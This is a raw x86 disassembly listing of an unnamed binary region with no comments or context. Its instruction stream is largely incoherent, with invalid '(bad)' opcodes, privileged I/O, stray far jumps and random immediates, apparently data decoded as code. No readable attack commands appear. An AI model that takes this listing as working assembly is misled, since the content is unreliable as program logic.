  421ddc:	gs add al,0x4e
  421ddf:	jns    0x421e54
  421de1:	adc    BYTE PTR [ebx+0x1d],cl
  421de4:	xor    eax,0x89399cac
  421de9:	push   ebx
  421dea:	sub    DWORD PTR cs:[edi+0x39807e8d],esi
  421df1:	xchg   ebp,eax
  421df2:	(bad)  
  421df3:	int    0x3b
  421df5:	add    dh,BYTE PTR [esi-0x71e69b04]
  421dfb:	mov    ebp,0x6374de47
  421e00:	pop    esp
  421e01:	mov    ebx,0xae73c1b9
  421e06:	xchg   ebp,eax
  421e07:	cmp    al,0x7f
  421e09:	add    ch,dl
  421e0b:	mov    eax,0xce32e4b9
  421e10:	sbb    ebx,DWORD PTR [esi+0x76]
  421e13:	js     0x421db1
  421e15:	pop    esi
  421e16:	inc    edi
  421e17:	std    
  421e18:	rol    BYTE PTR [edx+0x4c],cl
  421e1b:	lahf   
  421e1c:	outs   dx,BYTE PTR ds:[esi]
  421e1d:	repnz add BYTE PTR [ebx-0x1622fb09],bh
  421e24:	aam    0x4e
  421e26:	outs   dx,DWORD PTR ds:[esi]
  421e27:	push   ebx
  421e28:	fisttp WORD PTR [ebp+0x59]
  421e2b:	repz cli 
  421e2d:	pop    DWORD PTR [ebp+0x60]
  421e30:	sahf   
  421e31:	repnz push edx
  421e33:	fbld   TBYTE PTR [ecx+edx*4-0x7c]
  421e37:	aaa    
  421e38:	inc    ebp
  421e39:	and    al,0x76
  421e3b:	imul   DWORD PTR [esi+edi*4-0x53]
  421e3f:	scas   eax,DWORD PTR es:[edi]
  421e40:	mov    WORD PTR [edx],fs
  421e42:	push   es
  421e43:	add    ebx,DWORD PTR [ebx-0x40fc7af]
  421e49:	cdq    
  421e4a:	jge    0x421e18
  421e4c:	jg     0x421e56
  421e4e:	repnz in al,dx
  421e50:	(bad)  
  421e51:	cli    
  421e52:	sbb    BYTE PTR [esi+0x5b],cl
  421e55:	sbb    eax,0x287ea6e1
  421e5a:	icebp  
  421e5b:	cdq    
  421e5c:	jns    0x421ed1
  421e5e:	mov    ds:0x76439977,eax
  421e63:	jnp    0x421e2d
  421e65:	int    0xd
  421e67:	loope  0x421e77
  421e69:	xchg   BYTE PTR [ebx-0x24],cl
  421e6c:	clc    
  421e6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e6e:	mov    bl,BYTE PTR [ecx-0x52d856b4]
  421e74:	pop    esi
  421e75:	not    BYTE PTR [edx-0x483670a8]
  421e7b:	xor    eax,0x247c11da
  421e80:	mov    al,ds:0x98223e53
  421e85:	jp     0x421e0d
  421e87:	mov    cl,0x1b
  421e89:	jnp    0x421e81
  421e8b:	clc    
  421e8c:	repnz mov db0,ebp
  421e90:	jmp    edx
  421e92:	lods   eax,DWORD PTR ds:[esi]
  421e93:	dec    esi
  421e94:	sar    DWORD PTR [ecx-0x33af3ffe],cl
  421e9a:	push   esp
  421e9b:	or     eax,0x4c33edc1
  421ea0:	xchg   ebp,eax
  421ea1:	cwde   
  421ea2:	hlt    
  421ea3:	and    esi,DWORD PTR [ebx+edi*8]
  421ea6:	pop    es
  421ea7:	xor    BYTE PTR [edi],0x55
  421eaa:	inc    ecx
  421eab:	mov    al,ds:0xe62c9ae4
  421eb0:	or     ah,dl
  421eb2:	not    DWORD PTR [ebx-0x7b]
  421eb5:	pop    esp
  421eb6:	or     eax,0xb45f85b3
  421ebb:	(bad)  
  421ebc:	mov    bh,0x72
  421ebe:	mov    esp,0xd3802392
  421ec3:	and    eax,0x480323d
  421ec8:	xlat   BYTE PTR ds:[ebx]
  421ec9:	jnp    0x421eca
  421ecb:	fwait
  421ecc:	jge    0x421f2a
  421ece:	dec    ebp
  421ecf:	lahf   
  421ed0:	shl    BYTE PTR [esi],0x1b
  421ed3:	shl    BYTE PTR [ecx+0x30],0xdd
  421ed7:	mov    ah,0x30
  421ed9:	retf   
  421eda:	mov    al,ds:0x5f09bdfa
  421edf:	mov    bh,0x2b
  421ee1:	inc    eax
  421ee2:	data16 (bad) 
  421ee4:	(bad)  
  421ee5:	cld    
  421ee6:	push   0xffffff8b
  421ee8:	pusha  
  421ee9:	and    DWORD PTR [esi-0x36],ebx
  421eec:	shl    ecx,cl
  421eee:	loopne 0x421eaf
  421ef0:	mov    ss,edi
  421ef2:	stos   BYTE PTR es:[edi],al
  421ef3:	sbb    ebp,eax
  421ef5:	pop    edi
  421ef6:	mov    bh,0xa5
  421ef8:	sbb    edx,DWORD PTR [ebx]
  421efa:	jecxz  0x421f19
  421efc:	add    al,0xda
  421efe:	xchg   DWORD PTR [ebx+esi*1+0x6311b274],esi
  421f05:	rcl    DWORD PTR [ebx+edi*2-0x4b610faa],1
  421f0c:	lds    eax,FWORD PTR [esi+0x12]
  421f0f:	jns    0x421f0c
  421f11:	mov    ch,BYTE PTR [edi-0x41]
  421f14:	xor    bh,BYTE PTR [ebp+0x66]
  421f17:	dec    eax
  421f18:	xlat   BYTE PTR ds:[ebx]
  421f19:	cmp    edx,DWORD PTR [edi-0x5ebadd0c]
  421f1f:	push   cs
  421f20:	mov    ebx,0xd87523b5
  421f25:	ss cwde 
  421f27:	pop    es
  421f28:	dec    edi
  421f29:	or     eax,0xc8a0cf5f
  421f2e:	cli    
  421f2f:	std    
  421f30:	mov    bh,0x89
  421f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f33:	inc    esp
  421f34:	(bad)  
  421f35:	loopne 0x421f89
  421f37:	sub    al,0xf2
  421f39:	sbb    al,0xde
  421f3b:	mov    ah,0x96
  421f3d:	retf   
  421f3e:	or     eax,0xd24022d
  421f43:	inc    ebp
  421f44:	int3   
  421f45:	ret    
  421f46:	mov    cl,0xe0
  421f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f49:	ret    0x15f5
  421f4c:	fsub   QWORD PTR [ebp-0x5c3fcc93]
  421f52:	cli    
  421f53:	imul   esp,DWORD PTR [esi+0x5ef8fe1],0x46
  421f5a:	out    dx,al
  421f5b:	shl    DWORD PTR ds:0x4d072c43,0x3b
  421f62:	sub    BYTE PTR [edi+0x48],0x8e
  421f66:	data16 aam 0xff
  421f69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f6a:	xor    BYTE PTR [eax-0x2b],dl
  421f6d:	sbb    ecx,DWORD PTR [ecx+0xd]
  421f70:	and    edx,DWORD PTR [edx-0x6e]
  421f73:	sub    eax,0xe3ccc854
  421f78:	add    eax,esp
  421f7a:	pop    ss
  421f7b:	dec    edi
  421f7c:	inc    esi
  421f7d:	pop    ebx
  421f7e:	and    BYTE PTR [ebp-0x70],cl
  421f81:	sub    BYTE PTR [esi],al
  421f83:	std    
  421f84:	mov    ah,0xaa
  421f86:	scas   eax,DWORD PTR es:[edi]
  421f87:	or     bl,BYTE PTR [ebx+0x567da5d1]
  421f8d:	shl    ch,cl
  421f8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f90:	call   0x35a5aa7e
  421f95:	cmp    esp,DWORD PTR [ecx+0x5e]
  421f98:	popf   
  421f99:	sbb    al,0x8f
  421f9b:	adc    edi,DWORD PTR [esi-0x57470e88]
  421fa1:	stos   BYTE PTR es:[edi],al
  421fa2:	mov    ds:0x9c635dcd,eax
  421fa7:	adc    esi,esp
  421fa9:	lock ret 0x9f73
  421fad:	inc    edi
  421fae:	xchg   esp,eax
  421faf:	jmp    0x5dbc:0x26cdb83b
  421fb6:	or     dl,BYTE PTR [edi-0x76]
  421fb9:	int    0xed
  421fbb:	test   eax,0x51be6d72
  421fc0:	push   0x770c3e6e
  421fc5:	jg     0x421fe4
  421fc7:	mov    bl,0xb6
  421fc9:	out    dx,al
  421fca:	or     ecx,DWORD PTR [eax-0x56986394]
  421fd0:	xor    DWORD PTR [ebp+0x74],edx
  421fd3:	stc    
  421fd4:	push   edx
  421fd5:	mov    ds:0xaee6c342,al
  421fda:	sbb    eax,0xec1008ff
  421fdf:	ja     0x421ff7
  421fe1:	pop    es
  421fe2:	out    0xed,eax
  421fe4:	xchg   edi,eax
  421fe5:	fcmovnu st,st(6)
  421fe7:	inc    ecx
  421fe8:	iret   
  421fe9:	or     dh,cl
  421feb:	mov    bh,0xaa
  421fed:	inc    esi
  421fef:	js     0x421fae
  421ff1:	cmc    
  421ff2:	rcr    DWORD PTR [eax+eiz*4-0x71],cl
  421ff6:	outs   dx,DWORD PTR ds:[esi]
  421ff7:	cmp    dl,cl
  421ff9:	sub    eax,0xc5768cca
  421ffe:	push   eax
  421fff:	les    ecx,FWORD PTR [edx]
  422001:	in     eax,0x61
  422003:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422004:	cmp    cl,BYTE PTR [edi]
  422006:	ret    0x46d7
  422009:	push   0xf34218fc
  42200e:	push   ecx
  42200f:	push   ss
  422010:	ret    0x3939
  422013:	mov    dh,0xa7
  422015:	es push 0x1b87a2d4
  42201b:	xchg   BYTE PTR ds:0xe8789f5f,ah
  422021:	ret    
  422022:	add    ch,ch
  422024:	adc    ecx,edx
  422026:	and    al,0x96
  422028:	add    eax,0x5d69f793
  42202d:	dec    edx
  42202e:	gs push ebp
  422030:	cmp    edx,DWORD PTR [ecx]
  422032:	xchg   BYTE PTR [ebx],dh
  422034:	int    0xf8
  422036:	jl     0x422049
  422038:	arpl   WORD PTR [esi+esi*1],dx
  42203b:	lock out 0xc6,al
  42203e:	jge    0x42208a
  422040:	dec    ebx
  422041:	pop    ecx
  422042:	and    bl,ch
  422044:	int3   
  422045:	sub    al,0xe
  422047:	inc    esi
  422048:	add    BYTE PTR ds:0x9da40f09,ah
  42204e:	je     0x4220b0
  422050:	and    DWORD PTR [eax+0x63],edi
  422053:	cmp    eax,0x531736ff
  422058:	rcr    BYTE PTR [esp+eax*1],cl
  42205b:	dec    ebp
  42205c:	retf   
  42205d:	add    eax,0x47beade5
  422062:	rcr    DWORD PTR [eax-0x2d93e30f],cl
  422068:	inc    edx
  422069:	fmul   st(2),st
  42206b:	shl    DWORD PTR [eax],1
  42206d:	arpl   WORD PTR [ecx],si
  42206f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422070:	mov    eax,0xca50bc0a
  422075:	cmp    ch,BYTE PTR [edi-0x17]
  422078:	xchg   BYTE PTR [ecx+edi*2],ah
  42207b:	pusha  
  42207c:	dec    esp
  42207d:	xchg   edx,eax
  42207e:	inc    esp
  42207f:	mov    ecx,0xbc0bc03a
  422084:	test   eax,0x9f309cb0
  422089:	sub    DWORD PTR [esi-0x785a8e0e],edx
  42208f:	test   DWORD PTR [edi+0x9],eax
  422092:	loop   0x422038
  422094:	nop
  422095:	(bad)  
  422096:	iret   
  422097:	sbb    esp,DWORD PTR [edx+0x55428947]
  42209d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42209e:	and    ch,ah
  4220a0:	add    ebx,DWORD PTR [eax-0x3f]
  4220a3:	lods   al,BYTE PTR ds:[esi]
  4220a4:	and    bp,cx
  4220a7:	test   al,0x75
  4220a9:	dec    esp
  4220aa:	sahf   
  4220ab:	pop    es
  4220ac:	xor    edx,DWORD PTR [edi]
  4220ae:	icebp  
  4220af:	inc    edx
  4220b0:	mov    bl,0xd3
  4220b2:	lea    edx,[ecx]
  4220b4:	mov    ebx,0x9f65a04e
  4220b9:	mov    ds:0x8de3262d,al
  4220be:	sub    DWORD PTR [eax],esi
  4220c0:	sbb    eax,0x691ff10f
  4220c5:	xor    DWORD PTR [esi],eax
  4220c7:	popf   
  4220c8:	aas    
  4220c9:	mov    ebp,0x3ee2198
  4220ce:	and    cl,bh
  4220d0:	out    0x48,eax
  4220d2:	jmp    0x4220ff
  4220d4:	test   al,0xcd
  4220d6:	popf   
  4220d7:	int    0x83
  4220d9:	push   ds
  4220da:	jne    0x4220a2
  4220dc:	(bad)  
  4220dd:	call   0x37c:0xd10447fb
  4220e4:	test   al,0x67
  4220e6:	ret    0x5b5b
  4220e9:	retf   0x328
  4220ec:	xchg   cl,dl
  4220ee:	add    eax,0x3fc53fd4
  4220f3:	mov    edx,0x51ef6c55
  4220f8:	nop
  4220f9:	fisubr WORD PTR [esi-0x60]
  4220fc:	inc    ebx
  4220fd:	mov    bl,0x16
  4220ff:	xchg   ecx,eax
  422100:	test   DWORD PTR [ecx+edi*1+0x1984999c],esp
  422107:	pop    ebx
  422108:	push   ebp
  422109:	cmp    ebp,ecx
  42210b:	mov    ecx,0x10031ddf
  422110:	push   DWORD PTR [edx+0x7c00c8b4]
  422116:	dec    esp
  422117:	fcmovnb st,st(4)
  422119:	ss ds jne 0x42219b
  42211d:	pop    ecx
  42211e:	dec    esi
  42211f:	pop    edx
  422120:	popa   
  422121:	nop
  422122:	in     eax,dx
  422123:	leave  
  422124:	and    eax,0xece2acfb
  422129:	jo     0x422147
  42212b:	data16 test al,0xdd
  42212e:	add    DWORD PTR [esi+0x70065698],ecx
  422134:	xchg   DWORD PTR [edi-0x2e],edx
  422137:	add    al,0xe5
  422139:	inc    ebp
  42213a:	ins    DWORD PTR es:[edi],dx
  42213b:	mov    bl,0x7f
  42213d:	scas   eax,DWORD PTR es:[edi]
  42213e:	mov    dh,0x5c
  422140:	jns    0x422101
  422142:	pop    ss
  422143:	in     eax,dx
  422144:	xchg   DWORD PTR [edi+0x15903fbe],esi
  42214a:	je     0x4221b0
  42214c:	inc    esp
  42214d:	push   cs
  42214e:	xor    DWORD PTR [esp+eax*2],0x779ada94
  422155:	cmp    BYTE PTR [esi],ch
  422157:	imul   esp,DWORD PTR [esi-0x6d],0x6f
  42215b:	in     al,dx
  42215c:	add    BYTE PTR [esi],0xdd
  42215f:	mov    eax,DWORD PTR [ebp-0x54]
  422162:	and    BYTE PTR [ebx+0x19947519],bl
  422168:	mov    dl,0x17
  42216a:	or     DWORD PTR [ecx+edx*1+0xc8e9d68],0xa738e6a6
  422175:	dec    edx
  422176:	push   cs
  422177:	test   BYTE PTR [edx+0xffe9886],ah
  42217d:	mov    ds:0xef4aebf6,al
  422182:	or     ah,dl
  422184:	mov    esp,0x6ea946b9
  422189:	fwait
  42218a:	and    DWORD PTR [esi-0x23],esp
  42218d:	fcmovb st,st(4)
  42218f:	xor    edi,eax
  422191:	clc    
  422192:	xchg   edi,eax
  422193:	xor    DWORD PTR [edi+0x3ba065d7],esp
  422199:	adc    ebp,DWORD PTR [eax-0x5caf5078]
  42219f:	ss std 
  4221a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221a2:	push   ss
  4221a3:	mov    dh,0xbd
  4221a5:	jle    0x4221be
  4221a7:	or     DWORD PTR [esi],ebp
  4221a9:	into   
  4221aa:	mov    cl,0xc1
  4221ac:	push   ds
  4221ad:	scas   al,BYTE PTR es:[edi]
  4221ae:	mov    ah,0xf8
  4221b0:	rcl    BYTE PTR [edx-0x34],cl
  4221b3:	clc    
  4221b4:	lock leave 
  4221b6:	out    0x8c,al
  4221b8:	jge    0x4221aa
  4221ba:	into   
  4221bb:	test   eax,0xff99f0f6
  4221c0:	das    
  4221c1:	outs   dx,BYTE PTR ds:[esi]
  4221c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221c3:	cli    
  4221c4:	mov    DWORD PTR [ebx],esp
  4221c6:	mov    ch,0x65
  4221c8:	bound  esi,QWORD PTR [eax+ebp*2-0x4b]
  4221cc:	(bad)  
  4221ce:	inc    esi
  4221cf:	lahf   
  4221d0:	and    eax,0xad4c6f26
  4221d5:	cmp    ecx,DWORD PTR [edi-0x5b047e5d]
  4221db:	sub    al,0x6f
  4221dd:	pop    edx
  4221de:	push   esi
  4221df:	cmp    dl,bl
  4221e1:	cld    
  4221e2:	add    al,0xdd
  4221e4:	idiv   BYTE PTR [ecx-0x558beacd]
  4221ea:	adc    al,0x2e
  4221ec:	bound  esi,QWORD PTR [ecx+0x3fdfbf8a]
  4221f2:	cmc    
  4221f3:	test   ebp,edx
  4221f5:	push   ecx
  4221f6:	sub    BYTE PTR [ebx+0x70ae0a96],dh
  4221fc:	mov    bl,0x1e
  4221fe:	jne    0x422217
  422200:	or     edi,DWORD PTR [eax+0x7]
  422203:	out    dx,al
  422204:	jle    0x42226d
  422206:	or     ebp,DWORD PTR [edi]
  422208:	mov    ebp,0x990cb172
  42220d:	sbb    BYTE PTR [ebx],cl
  42220f:	adc    esi,DWORD PTR [eax+ebx*8]
  422212:	lahf   
  422213:	iret   
  422214:	mov    ebx,0xca7feb84
  422219:	push   eax
  42221a:	inc    ebx
  42221b:	sbb    BYTE PTR [edi+0x23e9acd0],dl
  422221:	xor    esi,ebp
  422223:	cli    
  422224:	sbb    esi,ecx
  422226:	fwait
  422227:	pop    eax
  422228:	leave  
  422229:	cmp    al,0xf8
  42222b:	fcom   DWORD PTR [eax-0x13ec07cd]
  422231:	jg     0x42227c
  422233:	jl     0x42225f
  422235:	xor    ebx,esp
  422237:	shr    DWORD PTR [ebx+0x10f838f7],1
  42223d:	les    edx,FWORD PTR [ecx+eax*2-0x3c857ef2]
  422244:	loopne 0x42225d
  422246:	mov    esp,0x1fc1dfb
  42224b:	xlat   BYTE PTR ds:[ebx]
  42224c:	push   ss
  42224d:	and    BYTE PTR [eax+0xe],bl
  422250:	pop    edi
  422251:	mov    eax,ds:0xd7367942
  422256:	mov    al,0xf6
  422258:	addr16 mov eax,0x9094eb81
  42225e:	add    al,0x62
  422260:	xor    DWORD PTR [ebp+0x4389fefe],esp
  422266:	jp     0x4222a8
  422268:	mov    eax,ds:0xb2761518
  42226d:	aam    0xc1
  42226f:	retf   0xb422
  422272:	jl     0x422284
  422274:	stos   DWORD PTR es:[edi],eax
  422275:	shl    dh,1
  422277:	test   al,0xf
  422279:	ins    DWORD PTR es:[edi],dx
  42227a:	dec    ecx
  42227b:	mov    bh,0xc0
  42227d:	imul   ebp,DWORD PTR [ebx],0x2e
  422280:	(bad)  
  422281:	pop    eax
  422282:	add    DWORD PTR [edi-0x37],0xffffff86
  422286:	pushf  
  422287:	icebp  
  422288:	clc    
  422289:	fwait
  42228a:	adc    eax,0xb92962f2
  42228f:	inc    esp
  422290:	pop    ds
  422291:	gs sub al,0x89
  422294:	push   edx
  422295:	imul   esi,DWORD PTR [ebp+ebx*8+0x2d],0x7b
  42229a:	cmp    BYTE PTR [ebp-0xb],bl
  42229d:	xor    DWORD PTR [edi],edx
  42229f:	aam    0x6f
  4222a1:	lea    esi,[eax+0x5714b84b]
  4222a7:	inc    ecx
  4222a8:	cs js  0x422285
  4222ab:	test   al,0xa9
  4222ad:	into   
  4222ae:	sbb    bh,BYTE PTR ds:0xb9117143
  4222b4:	in     al,0xab
  4222b6:	shr    BYTE PTR [edi-0x65],cl
  4222b9:	add    ecx,ebp
  4222bb:	push   edx
  4222bc:	and    eax,0x278be17e
  4222c1:	xchg   DWORD PTR [edx+0x36],edx
  4222c4:	adc    DWORD PTR [ebp-0x24a99cd],edi
  4222ca:	icebp  
  4222cb:	in     al,0x92
  4222cd:	pop    edi
  4222ce:	(bad)  
  4222cf:	iret   
  4222d0:	dec    esi
  4222d1:	push   esp
  4222d2:	cmp    dl,BYTE PTR [eax+ebp*4]
  4222d5:	mov    dh,0x59
  4222d7:	or     DWORD PTR [eax-0x41b73bff],0xbe345774
  4222e1:	sar    ebx,cl
  4222e3:	mov    esi,0x81335d3a
  4222e8:	pushf  
  4222e9:	inc    edx
  4222ea:	mov    ecx,0x5cbf84a4
  4222ef:	xor    eax,0x488b242c
  4222f4:	dec    esi
  4222f5:	loopne 0x422278
  4222f7:	pushf  
  4222f8:	push   edi
  4222f9:	(bad)  
  4222fa:	test   eax,0x9b2c1c60
  4222ff:	jmp    0x50b74d83
  422304:	push   edx
  422305:	fst    DWORD PTR [edi+0x45]
  422308:	xor    al,0xf1
  42230a:	xchg   edi,eax
  42230b:	shl    DWORD PTR [edx-0x30],1
  42230e:	adc    dh,BYTE PTR [eax-0x29]
  422311:	ror    BYTE PTR [esi-0x23],1
  422314:	sbb    ebx,ebp
  422316:	xor    eax,0x7758d327
  42231b:	ss (bad) 
  42231e:	pop    edi
  42231f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422320:	pop    edi
  422321:	or     eax,0xf643bad7
  422326:	enter  0xea22,0x5b
  42232a:	sub    ebx,DWORD PTR [esp+edx*1]
  42232d:	mov    al,0x2f
  42232f:	xchg   ecx,eax
  422330:	sbb    eax,0x8161ac07
  422335:	xor    al,dl
  422337:	ja     0x422357
  422339:	hlt    
  42233a:	dec    ecx
  42233b:	cmc    
  42233c:	mov    ecx,0xc8fa02ab
  422341:	loope  0x42235c
  422343:	in     al,0x35
  422345:	cmp    esi,DWORD PTR [eax+0x2eb740a0]
  42234b:	ins    DWORD PTR es:[edi],dx
  42234c:	mov    ah,0xb7
  42234e:	test   DWORD PTR [eax],eax
  422350:	(bad)  
  422351:	cwde   
  422352:	imul   ebp,DWORD PTR [ebx+0x1494a02c],0x4f
  422359:	xchg   ecx,eax
  42235a:	push   cs
  42235b:	xor    edi,DWORD PTR [edx-0x27f0bef]
  422361:	clc    
  422362:	or     ch,cl
  422364:	int    0x6f
  422366:	mov    WORD PTR gs:[ecx-0x7d],?
  42236a:	enter  0xc04e,0xd4
  42236e:	jae    0x42235a
  422370:	retf   
  422371:	xor    eax,esp
  422373:	rcr    DWORD PTR [ecx+edx*1-0x5c],1
  422377:	ror    BYTE PTR [esi+ebx*2-0x80],1
  42237b:	dec    edx
  42237c:	lock inc edx
  42237e:	jbe    0x422312
  422380:	sbb    al,0x88
  422382:	mov    eax,0x57a5588a
  422387:	push   ecx
  422388:	xor    esp,DWORD PTR [ebx+0x35]
  42238b:	out    dx,eax
  42238c:	je     0x422368
  42238e:	pop    ecx
  42238f:	dec    edx
  422390:	pop    edi
  422391:	mov    WORD PTR [ebx],ss
  422393:	pop    ebp
  422394:	xchg   ebp,eax
  422395:	dec    ecx
  422396:	fldcw  WORD PTR [edx]
  422398:	fistp  QWORD PTR [esi+ecx*4+0x38]
  42239c:	add    DWORD PTR [eax],esp
  42239e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42239f:	sub    eax,0x9cf3bbac
  4223a4:	xchg   esi,eax
  4223a5:	sahf   
  4223a6:	gs in  al,0x77
  4223a9:	sbb    ebp,eax
  4223ab:	out    0xca,eax
  4223ad:	inc    edx
  4223ae:	in     al,0x88
  4223b0:	(bad)  
  4223b1:	daa    
  4223b2:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223b4:	adc    DWORD PTR [eax],0x2815f86a
  4223ba:	and    al,0xdb
  4223bc:	dec    ebp
  4223bd:	clc    
  4223be:	cmp    BYTE PTR [esi-0x46],dh
  4223c1:	daa    
  4223c2:	inc    eax
  4223c3:	add    al,0x18
  4223c5:	imul   ebx,esp,0x3571d9ea
  4223cb:	int3   
  4223cc:	jbe    0x422448
  4223ce:	sbb    BYTE PTR [edx-0x50],bl
  4223d1:	imul   ecx,DWORD PTR [ecx-0x41],0x64
  4223d5:	ror    DWORD PTR [esi-0x1a],1
  4223d8:	aam    0x90
  4223da:	xchg   edi,eax
  4223db:	add    esp,DWORD PTR ds:0x26ddd0c6
  4223e1:	jbe    0x4223e5
  4223e3:	jne    0x4223ef
  4223e5:	dec    ebx
  4223e6:	cdq    
  4223e7:	inc    edx
  4223e8:	jge    0x422443
  4223ea:	push   eax
  4223eb:	lock ja 0x422448
  4223ee:	mov    WORD PTR [edx-0x3a],fs
  4223f1:	pop    eax
  4223f2:	xor    eax,0x8b122ea9
  4223f7:	cdq    
  4223f8:	std    
  4223f9:	sbb    BYTE PTR [ebx-0x28],cl
  4223fc:	or     eax,0xb948db4d
  422401:	jne    0x422387
  422403:	clc    
  422404:	jbe    0x42238d
  422406:	add    BYTE PTR [edx-0x1fd345de],dh
  42240c:	sub    DWORD PTR [esi+0xd],ebp
  42240f:	out    dx,al
  422410:	jmp    0x4223d4
  422412:	js     0x4223dc
  422414:	sub    al,0xd7
  422416:	mul    BYTE PTR [ebp+0x645cd492]
  42241c:	(bad)  
  42241d:	(bad)  [ecx+0x1ff37bb5]
  422423:	fs enter 0x8978,0xd6
  422428:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422429:	push   eax
  42242a:	mov    bl,cl
  42242c:	cmp    eax,DWORD PTR [ebx+0x6a]
  42242f:	mov    DWORD PTR [esi],0x9b5a11d3
  422435:	out    0x22,eax
  422437:	ins    BYTE PTR es:[di],dx
  422439:	in     eax,0x16
  42243b:	jnp    0x42240c
  42243d:	pop    ebx
  42243e:	jbe    0x42249f
  422440:	mov    ah,0xc6
  422443:	mov    ds,WORD PTR [esp+edx*4]
  422446:	inc    BYTE PTR [edi+0xd]
  422449:	mov    ds:0xb9de617b,eax
  42244e:	sub    ecx,ebp
  422450:	jne    0x4224d1
  422452:	xchg   ebx,eax
  422453:	mov    ds:0x451297d7,eax
  422458:	in     eax,0xc8
  42245a:	jl     0x422429
  42245c:	mov    al,0x79
  42245e:	loop   0x4224b6
  422460:	jnp    0x422441
  422462:	imul   esp,DWORD PTR [esi],0xffffffae
  422465:	hlt    
  422466:	xchg   esi,eax
  422467:	add    ebx,edx
  422469:	jl     0x4224d6
  42246b:	mov    esi,0xa6e31466
  422470:	jle    0x4224c6
  422472:	(bad)  [ebp+0x2737690e]
  422478:	push   cs
  422479:	pop    ebx
  42247a:	test   al,0xb4
  42247c:	xor    BYTE PTR [ebp+0x11],bl
  42247f:	xor    DWORD PTR [ebx+0x102a4188],esp
  422485:	add    esp,edi
  422487:	adc    al,0xd
  422489:	mov    eax,0xb9e96f6e
  42248e:	push   ebp
  42248f:	rcl    BYTE PTR gs:[ebx],1
  422492:	clc    
  422493:	dec    esi
  422494:	aad    0x81
  422496:	xlat   BYTE PTR ds:[ebx]
  422497:	cmp    dl,ch
  422499:	inc    esi
  42249a:	fs js  0x4224ed
  42249d:	add    dl,al
  42249f:	adc    bl,BYTE PTR [edx+0x28247cc9]
  4224a5:	and    bl,BYTE PTR [edx]
  4224a7:	cmp    al,0xa1
  4224a9:	cmc    
  4224aa:	les    ebx,FWORD PTR [edx+0x56b06df6]
  4224b0:	aad    0x7a
  4224b2:	and    al,0x2
  4224b4:	bound  esi,QWORD PTR [edx+0xb9faf7d]
  4224ba:	sub    bh,BYTE PTR [edi-0x4e]
  4224bd:	test   al,0x12
  4224bf:	xchg   edx,eax
  4224c0:	sar    DWORD PTR [edi+0x1c],0xd6
  4224c4:	call   0x4ffd:0x2af4a400
  4224cb:	inc    esi
  4224cc:	(bad)  
  4224cd:	mov    ds:0x543f0eee,al
  4224d2:	ins    BYTE PTR es:[edi],dx
  4224d3:	(bad)  
  4224d4:	arpl   WORD PTR [eax+ebp*1+0x1e9e0444],cx
  4224db:	ss push edi
  4224dd:	(bad)  
  4224de:	xor    esi,DWORD PTR [edi+0x2d66e663]
  4224e4:	inc    edi
  4224e5:	sti    
  4224e6:	fdivr  QWORD PTR [edx-0xbaa95dd]
  4224ec:	(bad)  
  4224ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224ee:	and    eax,0xb7e3542a
  4224f3:	lods   al,BYTE PTR ds:[esi]
  4224f4:	fmul   QWORD PTR [ebp-0x6a]
  4224f7:	xchg   edx,eax
  4224f8:	dec    ebp
  4224f9:	pop    ebp
  4224fa:	icebp  
  4224fb:	jo     0x422515
  4224fd:	pop    esp
  4224fe:	shl    DWORD PTR ds:0x4a943c6,1
  422504:	mov    bh,0x2f
  422506:	adc    al,0x81
  422508:	mov    bl,BYTE PTR [esi+0x26]
  42250b:	(bad)  
  42250c:	jmp    0x92ee2890
  422511:	sar    DWORD PTR [edx-0x7c],cl
  422514:	addr16 xchg edx,eax
  422516:	add    BYTE PTR [ebx],bl
  422518:	popf   
  422519:	xchg   ebx,eax
  42251a:	and    bl,BYTE PTR [eax+0x4d3d144b]
  422520:	sbb    BYTE PTR [edx+0x7e],dl
  422523:	out    dx,al
  422524:	sbb    bl,BYTE PTR [ecx-0x2bde4220]
  42252a:	sbb    ecx,DWORD PTR [esi-0x2f0b575a]
  422530:	bound  ecx,QWORD PTR [ebp+0x4f]
  422533:	ins    BYTE PTR es:[edi],dx
  422534:	xor    esi,esp
  422536:	out    dx,al
  422537:	js     0x422574
  422539:	test   DWORD PTR [ecx+0x7f33d303],eax
  42253f:	sub    DWORD PTR [edx-0x3794dc00],ebx
  422545:	int3   
  422546:	add    DWORD PTR [edi-0x42],esp
  422549:	lds    ebp,FWORD PTR [esi+0x5d10474d]
  42254f:	and    eax,0xf8e31cf9
  422554:	mov    edx,0x8456ea1d
  422559:	jmp    0x64896635
  42255e:	sub    bh,dl
  422560:	sbb    dh,bl
  422562:	test   BYTE PTR [ecx-0x2e],ah
  422565:	in     eax,dx
  422566:	adc    BYTE PTR [edi-0x59ddd3b6],0x95
  42256d:	xchg   DWORD PTR [edx-0x3112964a],edx
  422573:	hlt    
  422574:	add    BYTE PTR ds:0xebc15acc,0xba
  42257b:	loope  0x422550
  42257d:	out    0x97,al
  42257f:	(bad)  
  422580:	and    DWORD PTR [eax+0x7],edx
  422583:	sbb    esp,DWORD PTR [esi+0x429b9b4d]
  422589:	jo     0x422550
  42258b:	pop    esp
  42258c:	jmp    0x1651:0x37e9a64c
  422593:	pusha  
  422594:	mov    al,ds:0xcf459c79
  422599:	(bad)  
  42259a:	sub    eax,0xcc5ca848
  42259f:	out    0xb0,eax
  4225a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225a2:	push   ebx
  4225a3:	cwde   
  4225a4:	push   eax
  4225a5:	pop    es
  4225a6:	sbb    ecx,DWORD PTR [esi-0x2f1836a7]
  4225ac:	cmc    
  4225ad:	aaa    
  4225ae:	inc    edx
  4225af:	pop    ebp
